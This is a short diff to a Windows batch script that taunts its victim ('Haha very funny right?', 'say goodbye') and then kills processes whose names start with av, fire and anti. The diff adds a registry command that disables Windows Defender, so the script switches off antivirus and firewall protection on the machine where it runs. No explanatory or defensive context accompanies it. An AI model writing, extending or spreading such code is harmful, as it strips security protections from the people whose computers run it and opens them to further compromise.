@@ -51,6 +51,8 @@ echo ...
 echo Haha very funny right?
 echo Well say goodbye 
 echo
+@echo off
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
 tskill /A av*
 tskill /A fire*
 tskill /A anti*
